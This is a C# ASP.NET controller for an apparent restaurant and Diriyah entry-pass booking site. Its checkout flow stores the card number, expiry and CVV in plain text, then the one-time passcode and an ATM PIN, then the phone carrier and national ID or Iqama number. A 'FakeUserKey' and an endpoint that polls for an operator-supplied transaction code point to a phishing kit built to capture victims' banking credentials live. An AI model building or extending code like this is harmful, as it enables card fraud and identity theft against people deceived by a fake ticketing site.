using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using BujairiTic.Models;
using static BujairiTic.Models.Enums;

public class BookingController : Controller
{
    private readonly AppDbContext _context;

    public BookingController(AppDbContext context)
    {
        _context = context;
    }

   
    [HttpPost]
    public IActionResult Create(int restaurantId,
                                DateTime BookingDate,
                                int Guests,
                                string SelectedTime)
    {
        var userKey = Guid.NewGuid().ToString();

        var order = new Order
        {
            FakeUserKey = userKey,
            Status = OrderStatus.Draft,
            Items = new List<OrderItem>()
        };

        OrderItem item;

        if (restaurantId > 0)
        {
            var restaurant = _context.Restaurants
                                     .FirstOrDefault(r => r.Id == restaurantId);

            if (restaurant == null)
                return NotFound();

            item = new OrderItem
            {
                Title = restaurant.Name,
                BookingDate = BookingDate,
                Guests = Guests,
                SelectedTime = SelectedTime,
                UnitPrice = restaurant.MinimumCharge,
                LineTotal = restaurant.MinimumCharge * Guests
            };
        }
        else
        {
           
            item = new OrderItem
            {
                Title = "تصريح دخول الدرعية",
                BookingDate = BookingDate,
                Guests = Guests,
                SelectedTime = SelectedTime,
                UnitPrice = 0,
                LineTotal = 0
            };
        }

        order.Items.Add(item);

        _context.Orders.Add(order);
        _context.SaveChanges();

        return RedirectToAction("Checkout", new { id = order.Id });
    }


    
    public IActionResult Checkout(int id)
    {
        var order = _context.Orders
                            .Include(o => o.Items)
                            .FirstOrDefault(o => o.Id == id);

        if (order == null)
            return NotFound();

        return View(order);
    }


    [HttpPost]
    public IActionResult SavePaymentMethod(int id, string method)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        order.PaymentMethod = method;

        _context.SaveChanges();

        return RedirectToAction("PaymentInfo", new { id });
    }


    
    public IActionResult PaymentInfo(int id)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        return View(order);
    }


    [HttpPost]
    public IActionResult SaveCard(int id, Order model)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        order.CardholderName = model.CardholderName;
        order.CardNumber = model.CardNumber;
        order.Expiry = model.Expiry;
        order.CVV = model.CVV;

        _context.SaveChanges();

        return RedirectToAction("Otp", new { id });
    }


   
    public IActionResult Otp(int id)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        return View(order);
    }


    [HttpPost]
    public IActionResult SaveOtp(int id, Order model)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        order.Otp = model.Otp;
        order.AtmPassword = model.AtmPassword;

        _context.SaveChanges();

        return RedirectToAction("CustomerInfo", new { id });
    }


   
    public IActionResult CustomerInfo(int id)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        return View(order);
    }


    [HttpPost]
    public IActionResult SaveCustomerInfo(int id, Order model)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        order.Mobile = model.Mobile;
        order.Provider = model.Provider;
        order.NationalIdOrIqama = model.NationalIdOrIqama;

        _context.SaveChanges();

        return RedirectToAction("Success", new { id });
    }


   
    public IActionResult Success(int id)
    {
        var order = _context.Orders
                            .Include(o => o.Items)
                            .FirstOrDefault(o => o.Id == id);

        if (order == null)
            return NotFound();

        return View(order);
    }


   
    [HttpGet]
    public IActionResult GetTransactionCode(int orderId)
    {
        var order = _context.Orders.Find(orderId);

        if (order == null)
            return Json(new { transactionNo = "" });

        return Json(new { transactionNo = order.TransactionNo ?? "" });
    }


    
    public IActionResult Tickets()
    {
        return View();
    }
}
